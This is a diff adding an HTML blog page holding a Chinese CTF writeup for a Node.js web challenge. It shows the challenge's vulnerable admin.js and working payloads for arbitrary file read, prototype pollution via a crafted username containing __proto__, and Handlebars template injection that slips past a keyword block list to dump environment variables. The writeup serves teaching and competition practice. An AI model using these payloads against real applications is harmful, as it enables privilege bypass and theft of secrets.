@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            华为HCIE的第一课 Writeup
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <div class="post-date">
+            <p> December 23rd 2020, 9:00:00 pm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+        </div>
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%AE%80%E8%A7%88"><span class="toc-text">题目简览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1"><span class="toc-text">简单审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hbs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">hbs模板注入导致信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>周末是XCTF的HarmonyOS和HMS专场比赛，起床后就开始看，因为这一道题花了比较长的时间才做出来，所以觉得还是有记录一下的必要。</p>
+<p>题目考点：</p>
+<ul>
+<li>Nodejs简单审计</li>
+<li>原型链污染漏洞</li>
+<li>hbs模板注入导致信息泄露</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="题目简览"><a href="#题目简览" class="headerlink" title="题目简览"></a>题目简览</h3><p>题目打开后需要输入用户名登录：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090744984810.jpg"></p>
+<p>登录之后是一个计算ip地址的一些信息的工具：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090746318175.jpg"></p>
+<p>点击去开发会跳转到<code>/admin</code>去，显示<code>forbidden</code></p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090747646935.jpg"></p>
+<h3 id="简单审计"><a href="#简单审计" class="headerlink" title="简单审计"></a>简单审计</h3><p>在打开题目后链接就会跳转到<code>http://124.71.204.195:31799/?f=login.html</code>，简单尝试一下就可以发现这里是一个任意文件读取：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090750515361.jpg" alt="-w859"></p>
+<p>可以把所有题目源码与相关依赖文件都下载下来，本地可以直接调试。需要注意的是这里没法下载<code>.env</code>文件，这个文件是用于<code>dotenv</code>模块加载环境变量配置的。</p>
+<p>简单审计一下可以了解到这些文件的基本用途：</p>
+<ul>
+<li>app.js 配置并启动express(其中包括设置session、静态文件、模板解析引擎、路由等等)</li>
+<li>login.js 用于设置<code>req.session.name</code>为传入的username</li>
+<li>calc.js 用于计算ip相关信息的代码(用于混淆用的，实际解题毫无用处)</li>
+<li>admin.js 会经过一个ip等信息的判断，可以设置计算ip页下发的内容，后面详细分析</li>
+<li>util.js 一些处理函数</li>
+</ul>
+<p>主要来看<code>admin.js</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">app, env</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123;htmlencode, replaceAll, md5&#125; = <span class="built_in">require</span>(<span class="string">&quot;./util&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>)</span><br><span class="line"></span><br><span class="line">    app.get(<span class="string">&#x27;/admin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> user</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = <span class="built_in">JSON</span>.parse(<span class="string">`&#123;&quot;name&quot; : &quot;<span class="subst">$&#123;req.session.name&#125;</span>&quot;, &quot;time&quot; : &quot;<span class="subst">$&#123;<span class="built_in">Math</span>.ceil(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>)&#125;</span>&quot;, &quot;ip&quot; : &quot;<span class="subst">$&#123;req.ip&#125;</span>&quot;&#125;`</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> userinfo = &#123;&#125;</span><br><span class="line">        <span class="built_in">Object</span>.keys(user).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (key.trim() === <span class="string">&quot;isAdmin&quot;</span>)</span><br><span class="line">                userinfo[key] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span> userinfo[key] = user[key]</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (req.session.ip === <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">            userinfo.isAdmin = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        req.session.name = userinfo.name</span><br><span class="line">        req.session.time = userinfo.time</span><br><span class="line">        req.session.ip = userinfo.ip</span><br><span class="line">        req.session.isAdmin = userinfo.isAdmin</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.session.isAdmin !== <span class="number">1</span>) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.render(<span class="string">&quot;admin&quot;</span>, &#123;<span class="string">&quot;name&quot;</span>:req.session.name&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    app.post(<span class="string">&quot;/admin&quot;</span>, <span class="keyword">async</span> (req, res)=&gt;&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.session.isAdmin || !req.body.code) &#123;</span><br><span class="line">            res.status(<span class="number">403</span>).end(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> html = <span class="string">&quot;name : &#123;&#123;name&#125;&#125;, time : &#123;&#123;time&#125;&#125;, ip : &#123;&#123;ip&#125;&#125; \ntips: &#123;&#123;env.banner&#125;&#125;&lt;br&gt;&lt;a href=&#x27;/admin&#x27;&gt;返回&lt;/a&gt;&lt;br&gt;&lt;br&gt;\n\n&quot;</span> + fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;../views/calc.html&quot;</span>))</span><br><span class="line">        <span class="keyword">let</span> list = [<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;unless&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;lookup&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;@&#x27;</span> ]</span><br><span class="line">        <span class="keyword">let</span> code = req.body.code + <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">let</span> padd = <span class="string">`&lt;p class=&quot;t-big-margin no-margin-b flex-center&quot;&gt;这里开发中...&amp;nbsp; &lt;a href=&quot;/admin&quot; target=&quot;_blank&quot;&gt;去开发&lt;/a&gt;&lt;/p&gt;`</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> list.forEach(<span class="function">(<span class="params">black</span>) =&gt;</span> &#123;</span><br><span class="line">            code = replaceAll(black, htmlencode(black), code)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        html = html.replace(padd, code)</span><br><span class="line">        <span class="keyword">let</span> filename = md5(html) + <span class="string">&quot;.html&quot;</span></span><br><span class="line">        <span class="keyword">let</span> filepath = path.resolve(__dirname, <span class="string">&quot;../views/users/&quot;</span>+filename)</span><br><span class="line">        <span class="keyword">if</span> (fs.existsSync(filepath))</span><br><span class="line">            fs.unlinkSync(filepath)</span><br><span class="line">        fs.writeFile(filepath, html, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                res.end(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.render(<span class="string">&quot;users/&quot;</span>+filename, &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span> : req.session.name,</span><br><span class="line">                    <span class="string">&quot;time&quot;</span> : <span class="built_in">Math</span>.ceil(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>),</span><br><span class="line">                    <span class="string">&quot;ip&quot;</span> : req.ip,</span><br><span class="line">                    <span class="string">&quot;env&quot;</span> : env.parsed</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把GET请求的过程理一下：</p>
+<ol>
+<li>通过<code>JSON.parse()</code>解析了一个json数据，一共有三个键：<code>name</code>、<code>time</code>、<code>ip</code>，而这个<code>name</code>是可控的，并且拼接到json中可以添加键值</li>
+<li>通过一次循环，将<code>user</code>的值传递给<code>userinfo</code>，但是当键名为<code>isAdmin</code>时，会把这个值置<code>0</code></li>
+<li>判断<code>req.session.ip</code>是否为127.0.0.1，如果是的话就把<code>userinfo.isAdmin</code>设置为<code>1</code></li>
+<li>把<code>userinfo</code>的值传给<code>session</code></li>
+<li>判断<code>userinfo.isAdmin</code>是否为<code>1</code>，如果不为<code>1</code>，则返回<code>forbidden</code></li>
+</ol>
+<p>这里我们的主要目的就是怎么让<code>isAdmin</code>为<code>1</code>，大概有这么几个思路：</p>
+<ol>
+<li>在上方第二步那里通过在键名里加一些特殊字符的<code>trick</code>让<code>isAdmin</code>无法被置为0 (fuzz了一下<code>00-ff</code>，失败)</li>
+<li>伪造ip地址<ol>
+<li>队友说可以通过伪造<code>req.ip</code>，设置<code>app.set(&#39;trust proxy&#39;, true);</code>就可以通过<code>X-Forwarded-For</code>伪造。<a target="_blank" rel="noopener" href="https://expressjs.com/en/api.html#req.ip">参考</a> (<code>trust proxy</code>默认为<code>false</code> 失败)</li>
+<li>我想的是通过控制<code>JSON.parse()</code>的参数值，让后面的ip不解析，而解析一个我们所控制的ip值来绕过ip检测 (没找到可以成功解析的方式 失败)</li>
+</ol>
+</li>
+<li>SESSION伪造 (之前说过无法读取<code>.env</code>，<code>session</code>的<code>secret</code>在这个文件里，不知道<code>secret</code>也不能任意上传文件的情况下无法伪造 失败)</li>
+<li>是否有原型链污染可以利用？</li>
+</ol>
+<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>前三种思路都失败了，后面发现是在JSON.parse这里存在一个原型链污染问题。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090779523552.jpg" alt="-w800"></p>
+<p>通过构造username为：<code>Threezh1&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:1&#125;,&quot;test&quot;:&quot;</code>就可以污染到<code>isAdmin</code>。通过<code>req.session.isAdmin = userinfo.isAdmin</code>这句命令传递后，我们再访问<code>/admin</code>页面就不会是<code>forbidden</code>了。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090866177957.jpg"></p>
+<p>这里提交的是一个<code>code</code>参数，POST发包给<code>/admin</code>页面。</p>
+<h3 id="hbs模板注入导致信息泄露"><a href="#hbs模板注入导致信息泄露" class="headerlink" title="hbs模板注入导致信息泄露"></a>hbs模板注入导致信息泄露</h3><p>接着来看一下POST请求是怎么处理的：</p>
+<ul>
+<li>判断<code>req.session.isAdmin</code>和<code>code</code>参数</li>
+<li>对<code>code</code>参数值进行了过滤，<code>list</code>列表里的内容都会过滤转义</li>
+<li>最后拼接了一个html页面源码写到本地文件再回显到页面上</li>
+</ul>
+<p>这里是一个比较明显的模板注入，搜了一下关于hbs的相关模板注入，找到了一篇关于Handlebars库导致RCE的文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4695">漏洞挖掘：Handlebars库 模板注入导致RCE 0day</a></p>
+<p>但很快啊，就发现RCE行不通，题目环境中的是最新版，文章中的payload已经不管用了。只能想其他的办法。</p>
+<p>注意到传入模板变量时候的一个问题：这里传入的<code>env</code>是把包含所有环境变量的变量传入进去了。又因为页面中的一部分是我们能传入<code>code</code>参数控制的。所以我们是可以通过一些模板定义好的语句读出所有的<code>env</code>所包含的环境变量的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res.render(&quot;users&#x2F;&quot;+filename, &#123;</span><br><span class="line">    &quot;name&quot; : req.session.name,</span><br><span class="line">    &quot;time&quot; : Math.ceil(new Date().getTime() &#x2F; 1000),</span><br><span class="line">    &quot;ip&quot; : req.ip,</span><br><span class="line">    &quot;env&quot; : env.parsed</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>首先是寻找到了这么一篇帖子：<a target="_blank" rel="noopener" href="https://caya8.hatenablog.com/entry/2020/06/07/181927">2020 Defenit CTF Writeup</a> 里面的payload形式是这样的：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#each this&#125;&#125;&#123;&#123;@key&#125;&#125; =&gt; &#123;&#123;this.toString&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#123;&#123;/each&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于这里的<code>@key</code>由于<code>@</code>被过滤了，以及这样简单的遍历没法得到环境变量中的内容，最后构造一了一个可以拿到所有环境变量的语句<a target="_blank" rel="noopener" href="https://handlebarsjs.com/zh/guide/builtin-helpers.html#each">参考</a>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#each this&#125;&#125;&#123;&#123;#with this&#125;&#125;&#123;&#123;#each this&#125;&#125;&lt;h3&gt;&#123;&#123;this.toString&#125;&#125;&lt;&#x2F;h1&gt;&lt;br&gt;&#123;&#123;&#x2F;each&#125;&#125;&#123;&#123;&#x2F;with&#125;&#125;&#123;&#123;&#x2F;each&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>submit之后就可以在页面上看到flag了：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090879519058.jpg"></p>
+<p>当时我写的时候比较匆忙，这个payload可以变得更短，payload@p1g3：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#each this&#125;&#125;&#123;&#123;#each this&#125;&#125;&#123;&#123;this.toString&#125;&#125;&#123;&#123;&#x2F;each&#125;&#125;&#123;&#123;&#x2F;each&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉题目不算特别难，但就是有很多地方意想不到。对各种细节还需要再注意一些…</p>
+
+    </div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
